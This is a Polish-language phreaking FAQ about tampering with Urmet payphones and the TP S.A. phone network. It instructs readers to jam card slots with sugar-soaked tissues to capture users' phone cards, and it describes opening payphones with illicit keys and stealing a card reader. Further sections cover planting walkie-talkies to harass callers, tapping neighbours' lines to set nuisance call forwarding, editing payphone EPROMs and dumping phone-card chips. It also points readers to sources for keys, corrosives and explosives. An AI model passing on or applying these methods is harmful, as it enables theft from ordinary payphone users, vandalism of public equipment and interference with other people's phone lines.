+€≤≤±±∞∞∞9.2.4.To jest najnowszy jesli chodzi o czas kiedy go wymyslono.Prawde
+mowiac to sam niewiem  jak na to wpadlem :)) ale  najwazniejsze jest to ze to
+wszystko dziala :)] Aby  zastosowac  ten sposob  potrzebujesz  kilku  waznych
+rekwizytow:  kluczyk do  niebieskiej,  5 chusteczek  higienicznych  i  ok. 15
+lyøeczek  cukru.  Sposob ten dziala tylko i wylacznie na niebieskich urmetach
+i najlepiej jesli posiadaja takπ plastikowa os≥one na wylot  kart  (lub takie
+co majπ "koleczko" przy wylocie kart)...  z reszta juz  chyba wiadomo o co mi
+chodzi... :)))  zeby  poprostu  nikt  nie  pakowal paluchow  do  wylotu kart.
+Zabieramy sie do roboty. Wez nalej 1/2 szklanki  goracej  wody i wsyp do niej
+12-15 ≥yzeczek cukru (najlepiej pudru). Mieszaj  tak dlugo az troche ostygnie
+woda.Teraz wsadü kilka husteczek higienicznych do szklanki na jakies 20 minut
+(az ich wlukna beda sie "rezchodzic"), teraz wyjmij  husteczki  ze szklanki i
+po wyciúnieciu  (nie mocnym) wsadz do torebki foliowej. Idz do urmeta, otworz
+go i wyjmij husteczki z torebki.  Zaphaj  kilkoma  wylot katrt (od wewnacz OF
+KORZ :)) powinno to wygladac tak jakby otwor byl czyms zalany po same brzegi.
+Jak woda wyparuje to cukier sie zkrystalizuje i z husteczek  sie  zrobi cos w
+stylu GIPS lub SZPACHEL ale o  wiele  mniej  kruchy :)))]  Najlepiej  jak  to
+zamontujesz pozno w nocy... to do rana moze wyschnie. Od  wewnacz tak uformuj
+by karty sie zeslizgiwaly do srodka ;)))... UWAGA: ODRAZU MOWIE ZE NIE JESTEM
+ZA TYM ABY NISZCZYC AUTOMATY CZY TEZ POZBAWIAC NIEWINNYCH LUDZI KART NA KTORE
+WYKLADAJA  ZAROBIONE  PRZEZ  SIEBIE  PIENIADZE.  NIE RZECZ W TYM BY "OKRADAC"
+NIEWINNYCH I UCZCIWYCH LUDZI LECZ =TP S.A.=
+
+
+
+€≤≤±±∞∞∞9.3.Zabawa z BLLURMET`em... Ten podpunkt napisalem z mysla o ludziach
+ktorym sie bardzo nudzi. Wedlug mnie najlepsza zabawa jest z krotkofalowkami.
+Zaraz wszystko opisze... Otoz potzrbne ci beda dwie krotkofalowki, kluczyk do
+niebieszczaka, tasma klejaca, i  troche fajnych pomyslow. Tak wiec zaczynamy.
+Podchodzisz  do  niebieskiego  (wczesnie rano, ok 4)  i  otwierasz  GO, teraz
+tasma  klejaca przyklejasz krotkofalowke go boku lub gory automatu (to zalezy
+od   wielkosci  krotkofalowki:) ,teraz  zamykasz URMET`a  i  dochodzisz sobie
+powoli  i spokojnie... (najlepiej zamontowac krotkofalowke w budce, w parku:)
+Wracasz na miejsce zbrodni ok 10 rano  i siadasz sobie na laweczce, niedaleko
+automatu (SUX) w  ktorym to wlasnie zamontowales sprytne uzadzenie jakim jest
+krotkofalowka... Teraz wypatrujesz sobie ofiare, ofiara podchodzi do URMETA i
+podnosi sluchawke  i pakuje mu karte do srodka... Teraz zaczyna dzialac twoja
+chora wyobraznia... Np.: ja robilem najczesciej cos takiego: ktos (blondynka)
+podnosi sluchawke, wklada karte i wybiera numer ja wtedy bralem krotkofalowke
+i mowilem: "Prosze wzucic zeton..." Zazwyczaj (8/10 osob)myslalo ze to ukryta
+kamera:)  Albo:  Podchodzi sobie jakis frajer (jebany Dres)  i dzwoni...   ja
+sobie spokojnie czekam az sie polaczy i... gadam bardzo denerwujaco:"nie moze
+byc...?" albo "Pierdolisz..?"  lub "Jak hamskooo...?!"  kolesie sie strasznie
+denerwuja , jeden nawet zaczol sie drzec: "Ty chuju zajebany!!! Ty..." No ale
+to  nie  moj  problem  co mu zrobili niedobrzy ludzie w bialych fartuchach :)
+Jakbys naprzyklad gadal do miktofalowki a nikt przy automacie nie reagowal to
+znaczy  ze  albo baterje  sa wyczerpane, za daleko jestes od automatu , jakis
+frajer z TeleKomuny Ci zajebal sprzet lub inny phreaker pod twoja nieobecnosc
+zagladal do srodka (a po co?) i znalazl sobie krotkofalowke...
+
+
+
+€≤≤±±∞∞∞9.4.Polowanie na URMET`a. Takwiec pewnego  dnia,  z reszta jak zawsze
+wyszedlem sobie polazic po miescie.  Po obchodzie  poszedlem po mojego kumpla
+mo samemu to troche kijowo :)) No i tak sobie lazilismy chyba ze 2,5 godziny.
+To niby nic ale zaszlismy cholernie daleko,patrze a tu taka fajna melina jest
+niedaleko. Wbitka do meliny, wypilismy napoje chlodzace (bezalkoholowe ;) sie
+wie... No i udalismy sie w strone chaty, i tak wlasnie po drodze nartafilismy
+sie Niebieskie pudlo:
+[ja]-te moze pokombinujemy cos...?
+[5i7h]-czeeeemuuu niiieee...
+podchodzimy i wyciagam karte z kieszeni... a tu klucz sie zaplontal. Duzo nie
+myslac wzielem i wsadzilem 00131000< do zamka i trach...
+[j]-qrwa nie chce isc...
+[5i7h]-jak nie chce?
+Troche sie zdenerwowalem... i zajebalem z piastki w dol obudowy  i  poszlo...
+[j]-no a juz myslalem...
+[5]-dobrze jest
+[j]-nikogo nie widac?
+[5]-nikogo nie ma...
+[5]-poczekaj, poczekaj!! Jakas babcia jedzie...
+[j]-juz?
+[5]-o.k. juz.
+jakos nie wiem czemu zaswitalo mi we lbie zebym wziol czytnik,wiec zdielem te
+blokade zajechana i zaczelem go wyciagac...
+[5]-na ch** ci to?
+[j]-a tak sopie... :)
+[5]-dobra to szybciej bo o 4 malem byc w chacie...
+[j]-a ktora jest?
+[5]-32 po :(
+wzielem czytnik pod kurtke, zamknolem bude i poszlismy...
+Z opowiadania tego plynie jeden moral: "Jak cos potrzebujesz, to idz na sobie
+zadupie..." Zartuje of korz :))) chodzi mi o to ze mylismy troche zpici i tak
+nie robilismy przypalu nawet przy babci na rowerze...
+
+
+€≤≤±±∞∞∞9.5.Ostatnio tak sie  zastanawialem  na jakie  okregi jest podzielony
+teren naszego kraju... oczywiscie okregi wyznaczone przez TelePse :) Tak wiec
+postanowilem pogadac z kolesiem z pod obcego herbu "TP S.A" :))) Koles ten to
+tak zwany  "Osiem". Wiele  sie nie dowiedzialem :) ale zawsze cos. Oto infosy
+jakie pozyskalem:
+
+Polska jest podzielona na regiony, w danym  regionie stosowany jest dany wzor
+kluczy  (do skrzynek, budek etc). Nazwy regionow  powstaja  przez  polaczenie
+"RT" i  odpowiedniego  numeru  identyfikacyjnego  danego regionu.  Nie  kazdy
+region jest takiej samej wielkosci. Np. ja mieszkam w regionie "RT-3", region
+ten jest  dosc duzy... nawet bardzo duzy. Bo "RT-3" to region podlegajacy pod
+Poznan, a obejmuje  Gorzow Wlkp. etc. az do Szczecina. Tylko jedna rzecz mnie
+zastanawia ile jest tych zajechanych regionow??  ja przepuszczam ze 4 albo 5.
+
+
+
+€≤≤±±∞∞∞9.6.Poszedlem  z  kumplem (5i7h) niedawno  zalozyc pulapke do jumania
+kart. Wybilem  numer  do TP S.A (do biura napraw), dalem sluchawke kumplowi i
+zabralem sie do  majstrowania... ale  to niewazne. Podczas  przyklejania tych
+tasm etc. 5i7h gadal z telekominiarzem:
+...
+[5i7h]-a da sie otworzyc niebieska budke...?
+[TP]-nie. to niemozliwe.
+...
+[5i7h]-a ilu sciezkowo jest nagrany pasek magn. na karcie?
+[TP]-niewiem, chyba jedno bo po co wiecej...
+...
+[5i7h]-powiedz mi, co to jest "C-90"?
+[TP]-to niebieski automat wrzutowy.
+...
+Centralnie  jak  zamknolem  to  rzelaztwo  i  5i7h mi powiedzial co ten debil
+gadal to myslalem ze sie zleje:))) Albo  specjalnie sciemnial albo jest lama.
+No ja sobie grzebie wewnacz niebieskiej a on mi gada ze nieda sie jej otwozyc
+samemu :))))
+
+
+€≤≤±±∞∞∞9.7.Jak tak sie bardzo nudzisz do mozesz podenerwowac  troche teleko-
+miniarzy poprzez zadawanie im pytan na  ktore  nie  znaja odpowiedzi. To moze
+niektorym wydaje sie glupie  ale to tylko  pozory. Otorz wyobrazmy sobie taka
+sytuacje: zakladasz sobie firme, po 10  latach  jest juz dosc duza...  zatru-
+dniasz duzo ludzi i w tym np.:  ludzi ktorzy lubia te prace. A ktos dzwoni do
+"twojej" firmy i zadaje ci tak szczegulowe pytania jej dotyczace ze nie znasz
+na nie odpowiedzi... jak  bys  sie czul...???? Tak wiec powracajac do tematu,
+znalazlem  kiedys (nie  az  tak dawno:)))  bardzo  ciekawy  numer infolini do
+TelePsy... goraco go polecam wszystkim  chetnym:  [0-800 100 800].  Przyznaje
+sie do  tego  bez bicia, ze  wlasnie  tam  pracuja  najwieksi debile z branzy
+telekomunikacyjnej... Polecam takze jeszcze jeden ciekawy numer, a konkternie
+numer do biura napraw.  Przepuszczam ze jest on  w calej polsce taki sam 918,
+ale nie jestem pewny ;))) wiem napewno ze w moim wojewodztwie i sasiednim, sa
+takie same.
+
+
+€≤≤±±∞∞∞9.8.Juz o tym wspominalem poczesci w punkcie [12]. Mysle ze temat ten
+jest naprawde wart uwagi.  Otoz  chyba  kazdy spotkal sie z sytuacja ze: np.:
+chcac kupic kluczyk 00515000< nawiazal kontakt z  osoba sprzedajaca klucze za
+jakiej 30 PLN ale po jakims czasie "spotyka" kogos kto chce mu sprzedac klucz
+za 50 PLN? Co sie okazuje, klucze od  tego drugiego  kolesia pochodza od tego
+pierwszego kolesia.  Do czego zmierzam? Alo chodzi mi o to ze koles kupil cos
+by to sprzedac o wiele drozej.I po co to? Moze jeszcze powroce do tych malych
+telefonow "Genius micro phone" czy jakos  tak. Koles co ma "sklep" na stronce
+hrabiego ("http://phreak.zone.to - http://incredible.bmtmc.gda.pl/~piotrek/")
+pozwala  sobie  sprzedawac za 100 PLN telefony kosztujace 9,99$ w USA (strona
+bodajze  producenta  "http://www.artmedia.com/products/miniphone.htm"), 40PLN
+w  polsce  (w dobrych sklepach z elektronika i salonach ERY!)  czy tez 20DM w
+niemczech (sklepy z elektronika A-Z etc.) No co tu wiecej powiedziec? Proste,
+koles co ma maila: "michal_cz@poczta.fm" to zwykly lamer  a nie phreaker, ten
+koles to prawdziwy lamer ale napewno zlapal kilku wiekszych od siebie lamerow
+ktorzy dali mu zarobic 50 PLN`ow na sobie.  Mam  rade nie ufajcie takim SUPER
+promociom a tak poza tym to text na TOP`ie stronki  (adnotacia)  do  Hrabiego
+na stronce phreak.zone.to/sklep  mowi jasno w czym rzecz.  No a teraz kolejna
+sprawa, odsylam do: http://kartychip.prv.pl/ He.. he.. he. Cena niezuzywalnej
+karty = 200 PLN. A to ciekawe?  Jak mozna sprzedac/kupic/posiadac karte ktora
+nie istnieje?  Ooo, a soft  za  jedyne 1500PLN ;))) to ja wole sobie sciagnac
+ten "SUPER TAJNY"  soft  z  sieci i nagrac samemu na CD to mi wyniesie jakies
+3PLN (za CD) + 6 PLN (za 1h inet`u) = 9 PLN i... zaoszczedzilem 1491 PLN`ow!!
+To jeszcze nic programatorek chipdrive`a za jedyne 140 PLN ;))) Nie... to juz
+przesada, ze sklepu programator w pudelku + gwarancia kosztuje  70 PLN  czyli
+znowu oszczedzasz  tym razem tylko 70 PLN ;)))  Mowie serio,  nie dajcie  sie
+robic w ch***. A stronka jaka ciekawa :))))))))) moze nawet zrobiona w jakims
+"Wordzie"...
+
+
+€≤≤±±∞∞∞9.9.No coz... wbrew pozorom uslugi dodatkowe central cyfrowych nie sa
+wcale takie beznadziejne i niepotrzebne.  Wedlug  mnie najbardziej na miejscu
+(jesli chodzi o tematyke) jest np.:  natychmiastowe  przekierowanie. Mozna to
+zastosowac przykladowo do zrobienia niezlej hamowy dla telekominiarzy... hmmm
+co mam na mysli?  Otoz, idziesz do blokowej piwnicy i po koleii podpinasz sie
+do kazdego z mieszkancow i robisz natychmiastowe  przekierowanie np, na numer
+biura obslugi abonenta ;))  i tak w kilku  blokach.  Najlepiej jak z  kilkoma
+phreakerami z miasta sie zgadac. Efek: W TePe sa telefony by  sie "urywaly";)
+A odnosnie tych przekierowan  to  zastanawia mnie jedno...  Kto placi za "to"
+dodatkowe polaczenie????   Aha...  przekierowanie  mozna  takze wykozystac do
+"namierzenia" numeru natretnego lamera co robi "gluche"  po nocach.  Poprostu
+przekieruj na komorke.  Mi  sie tez  cos  takiego zdarzylo...  okazalo sie ze
+gluche byly robione z tel. komorkowego,  jako rewanz  przekierowalem  moj nr.
+na numer domowy tego ciecia  co  do mnie  dzwonil.  Ciekawe jak sie czul  gdy
+robiac mi "gluche" - w  tym  samym czasie "ktos" dzwonil do niego...  ;))))))
+Zreszta  sam  mozesz znalesc  ciekawe  zastosowanie dodatkowych uslug central
+cyfrowych, ktore ci sie najbardziej przydadza.
+
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞10.Zabawa z EPROM`em z niebieskiego URMET`a jest na prawde bardzo ale
+to bardzo ekscytujaca.  Do najwazniejszych spraw nalezy zdobycie EPROM`u. Ale
+oczywiscie mozesz  go  sobie zapozyczyc  z jakiegos automatu...  Programatory
+EPROM`Ûw mozesz sobie kupic wysylkowo z  roznych katalogow, lub zrobic samemu
+(jak komus to pasi i potrzebuje schemat to mail me)  Aby to wszystko dzialalo
+potrzebny ci jeszcze bedzie odpowiedni Soft (odpowiednie nazedzia powinny byc
+na mojej stronce (http://phreaking.at/lord lub www.grandmaster.hg.pl) No i to
+chyba wszystko czego potrzebujesz aby edytowac zawartosc EPROM`Ûw.
+
+€≤≤±±∞∞∞10.1.Co ona do cholery gada? Jak  zapewne  wiecie (sorry Lammer`s) to
+istnieje mozliwosc wprowadzenia  w  'binariach' EPROM`u zmian ktore spowoduja
+ze biedna budka zacznie  pisac niedorzeczne wionzanki slow... Jesli posiadasz
+odpowiedni programator (czytaj punkt 9) to  najlepiej sobie skombinuj program
+(powinien byc na [L.G] pp)  grupy "Urmet Developers"  do edycji EPROM`ow, ich
+programik  ma  wbudowana  funkcje do zamiany textow w 'kostkach' i inne fajne
+funkcje...
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞11.Widzialem w sieci wiele  programatorkow do  kart Chipowych,  wiek-
+szosc kosztuje  ponad 100 PLN,  polecam  Chipdrive MICRO - jest maly i dobry.
+W  sieci kosztuje od 90-150 PLN  a w sklepie C0NRAD`a(www.conrad.pl) 75 PLN!!
+Polecam. A tak przy okazii to szukam wspolpracy z osobami  interesujacych sie
+kartami    chipowymi   (tylko  polskie  i  telefoniczne   mam   na   mysli!).
+Oto zawartosc karty 25 TPSA zczytanej chipdrive`m: (pelna)
+                                         \/
+0000:97 74 26 FC 31 DC 65 17 00 00 00 E0 80 7F FF FF 
+0010:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0020:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0030:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+
+A to karta ta sama karta 25 bez jesnego impulsu:
+                                         \/
+0000:97 74 26 FC 31 DC 65 17 00 00 00 E0 00 7F FF FF 
+0010:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0020:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0030:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
+
+Dane zczytane z pustej niemieckiej karty 12DM. "Deutsche Telekom AG":
+0000:BB F4 F1 53 05 C3 6A 1F 00 00 00 00 00 7F 00 00 
+0010:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0020:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0030:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+-------------
+Status=active
+LockedBy=0,SmartCard Explorer V2.14
+Type=SLE4436
+Protocol=ATR
+Apps=TWK,
+CardCount=1
+CardPower=1
+MemSize=64
+AtrBinarySize=4
+AtrBinary=BB F4 F1 53 
+Seriennummer=30031?0610<
+Hersteller=GemPlus, Filderstadt Sielmingen
+Datum=MRZ 19x0
+Orginalwert=12,00 DM
+Restwert= 0,00 DM
+Chipcode=4433
+ChipHersteller=SIEMENS
+Betreiber=Deutsche Telekom AG
+-------------
+
+A to pusta Dunska karta 50Kr. "TELE DANMARK":
+0000:97 44 40 00 BC 95 4E A4 00 00 00 00 00 FF 7F 3B 
+0010:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0020:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+0030:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+-------------
+Status=active
+LockedBy=0,SmartCard Explorer V2.14
+Type=SLE4436
+Protocol=ATR
+Apps=TWK,
+CardCount=2
+CardPower=1
+MemSize=64
+AtrBinarySize=4
+AtrBinary=97 44 40 00 
+Seriennummer=0;05:404149
+Hersteller=Orga Kartensysteme, Dreieich
+Datum=MAI 19x;
+Orginalwert=??
+Restwert= 0,00 DM
+Chipcode=?
+ChipHersteller=SIEMENS
+Betreiber=?
+-------------
+
+Jak widac  wiele sie nie zmienilo ;).  Oczywiscie pewne sektory nie daja  sie
+zczytywac i zwracaja wynik FF ;(   Mysle  ze warto  sie  pobawic  CHIP`ami bo
+to jest przyszlosc.
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞12.Phreak SZOP:)Czyli co gdzie kupic...Zacznijmy od podstaw. Phreako-
+phone (raczej rusztowanie do niego:)  mozesz kupic na targach  z elektronika,
+lub  w komisie (nie polecam:).  "Papuge" - sluchawko mikrofon najlepiej kupic
+sobie w jakims pozadnym sklepie z akcesorjami do komputera, na przyklad takim
+sklepem  jest Vobis etc. Klucz do Blurmeta najlepiej kupic od znajomego (...)
+montera TelePsy , moj kumpel  ze Szczecina kupil klucze do Blue i Silver`a za
+40zl...  jesli  nie znasz zadnego montera TP to nie szkodzi. Ja tez sprzedaje
+klucze 00131000, no ale nie byle komu:( Jak Ci nie lezy to mozesz kupic klucz
+od kogos innego...  Moge kogos polecic - ale nieoficjalnie (mail).  Z kluczem
+do Srebrnego Urmet`a jest podobnie, sπ ale nie dla kazdego...:) Karta progra-
+mming? jest dostepna przez siec (ceny od 50-150zl). Akcesorja takie jak lomy,
+mlotki , obcegi mozna kupic  w  sklepie z akcesorjami Budowlanymi. Substancje
+zrπce dostepne sa  w  sklepach Chemicznych.  Materja≥y wybuchowe (jak TROTYL)
+sπ ale tez NIE dla kazdego... tylko dla zaufanych ludzi z branøy!  Jak chcesz
+kupic phreakomacik to odsylam na strone Hrabiego  (cena o ile dobrze pamietam
+wacha sie ok 100zl) jednak ostatnio znalazlem witryne z takimi samymi phreako
+matami za 9,99$ od sztuki :))) fajnie tylko  ze to z USA ;((. Tak poza tym to
+mam dostep do takich samych mikro-telefonow ale... za 40 PLN a w dziale SKLEP
+na  "phreak.zone.to"  cena wynosi 100 PLN (wraz z przesylka) co za tym idzie:
+oplata za uslugi pocztowe siega UWAGA: 60 PLN!!!! wiecej niz towar!!! ;))))))
+To czyste hamstwo.  Nagrywarke  mozna kupic  za  250-500 PLN  (sch.+soft),  a
+emulator centrum nadzoru za 3.000-4.000PLN!!! Niby niemozna a jednak ...
+
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞13.Tak wiec moge bez zadnych konsekwencji...:)) i zawachan oswiadczyc
+ze najnowsza (uaktualniona) wersja Tego  FAQ  bedzie  ZAWSZE dostepna  na  co
+najmiej jednej ze stron:    (Jak ktorys z adresow nie dziala to dajcie znac.)
+
+ +--------------------------+[World Wide Web ;)]+------------------- --- -- -
+ |
+ +-->o http://phreaking.at/lord/        <--------+[my fauvorit;)]+----------+
+ +-->o http://www.grandmaster.hg.pl/     <---+[this is best transver]+-----+
+ +-->o http://lgrand.8k.com/                                              /
+ +-->o http://www.lord-grand.da.ru/                                      /
+ +-->o http://phreaking.of.pl/                                          /
+ |                                                                     /
+ +--------------------------------------------------------------------+
+
+BTW: Szukam kogos kto posiada jakis dobry serwerek (dobry transfer) i mogl by
+udostepnic jakies konto o pojemnosci ok. 20 Mb. Nie mowie ze bezinteresownie.
+Co do szczegulow sie dogadamy.  Jak cos to napisz: grandmaster@poczta.onet.pl
+
+  
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞14.A teraz podziekowania dla ludzi ktorzy naprawde sa dobrzy i siedza
+od dawna w temacie... (lub od niedawna:) No ale nie oto chodzi za to co robia
+poprostu... Jesli ciebie niema na liscie to zapomnialem widocznie o tobie ...
+
+Gre3tZ t0:
+   [Viedzmin - za inspiracje]
+   [Hrabia]
+   [ULYSES]
+   [Telesfor team - ich stronka padla ;(]
+   [Phaf1k - "mikro"phone:)))]
+   [Cargo]
+   [ALIEN - za programminga ;)]
+   [Aril - Spoko]
+   [ANT Crew]
+   [KajSioR]
+   [5i7H - yo]
+   [Kaczmi , Fazi and Kamien from N.A.S - SpokZ]
+   [& wszystkich grup Phr3akeRskiCh w Polsce - za to co robia]
+   [i kazdego   phreakera    ktorego   znam  ,   lub   ktory   mnie   zna...]
+
+AntY gReETz tO:
+   [A^te from zielona gora]
+   [lammerZ - naturalnie]
+   [dresiarze]
+   [asturn - za to ze dal dupy tym z TVN24]
+   [hermesy - kroja kogo popadnie]
+   [& wszystkich ktorzy 'cynia' swoja niewiedza...]
+
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞15.Zakonczenie. Na koniec very thnx za  czytanie moich "wypocin". Nad
+FAQ siedzialem dobre kilka godzin (razy kilka dni). Mam nadzieje ze text jest
+w miare dobry. Bo przecierz moim sponsorem  jest nasza kohana Telekomunikacja
+Polska S.A. :))Zarazem chcialbym zauwazyc abyscie nie zwracali uwagi na bledy
+poniewasz   jestem  dysortografikiem , dyslektykiem  i  alfabetom :)  H^h^hi.
+Chcialbym jeszcze powiedziec ze trzeba pisac wiecej FAQ`ow  i  edukowac narod
+bo zauwazylem ze powstaje coraz mniej textow o tematyce Phreak ;(((.   Samemu
+nikt nic nie zdziala, dlatego trzeba sie niejako zjednoczyc. W  sieci  polski
+phreak jest w niezbyt  dobrej formie ;(, aby znalezc  w miare dobra strone to
+trzeba sie sporo pogimnastykowac... Niestety nie jest za dobrze;( , ale mozna
+to zmienic. Ja znam  5 adresow stron phreak, ktorych "poziom" jest jako taki,
+ale  moglo  by ich byc setki... Mazenia :))) chociarz trzydziesci. Oki to juz
+koniec, wiec zycze milej zabawy i  DUZO szczescia  (nie dajcie sie zlapac...)
+Baj baj...
+
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞16.Yo, FAQ v.2002. Szukam osob interesujacych sie kartami  chipowymi,
+oraz centrum nadzoru. Chodzi mi o  nawiazanie wspolpracy.  Jak macie (wiecie)
+cos ciekawego to mail.  A... wrazie problemuFF  z  FAQ ;) mail jest na gorze.
+
+
+--------------------------------Lekrama:)------------------------------------
+     \`````\_.$                         TELEKOMUNA POLSKA S.A.
+      \ .  .\$$                         Upszejmnie  informuje sznofnych panuf
+     _.\     \$                         prejkeruf   o  nieprowadzenie dzialan
+  _.:;;$\     \$$$$$$$$                 majacych   na    celu   doprowadzenie
+.;$$$$$$$\     \$$$$$$$                 do  upadku  firmy  oraz  zwraca sie z
+&$$$$$$$$$\     \$$$$$$                 apelem     do    abonentow  TP s.A  o
+         $$\     \                      bezinteresowne  dawanie sie  okradac,
+         $$$\     \$$$$$$$$$$$$,        oszukiwac  i  wyzyskiwac   na   rzecz
+         $$$$\     \$$$$$$$$$$$$$$,     OBCEGO kapitalu.
+         $$$$$\     \$$$$$$$$$$$$$$$,
+         $$$$$$\     \$$$    `$$$$$$$:
+         $$$$$$,\     \$$     $$$$$$$:
+         $$$$$$$,\     \$    ,$$$$$$$;  Moj APEL:
+         `$$$$$$$$\     \$$$$$$$$$$$'   Niedawaj  sie   okradac   przez  tych
+          `$$$$$$$$\     \$$$$$$$$$'    zlodzieii  z   Telekomuny.  Oni  maja
+            `$$$$$$$\     \$$$$$$`      tyle kasy ze szkoda  gadac... Obecnie
+              `''''$$\     \''`         panujace taryfy sa  nieporownywalne z
+                   $$$\     \           taryfami panujacymi w innych krajach.
+                   $$$$\     \          Taka jest prawda. Olaty za telefon sa
+                   $$$$$\     \         za wysokie  biarac  pod  uwage  jakos
+                   $$$$$$\ .  .\        polaczen  oferowanych  przez  TP S.A.
+                   $$$$$$ \,,,,,\       >>>>>>>NIE DAJ SIE OKRADAC!!!!<<<<<<<
+-----------------------------------------------------------------------------
+[phreaker@tpsa.pl]: ^]
+EndOfFile
+
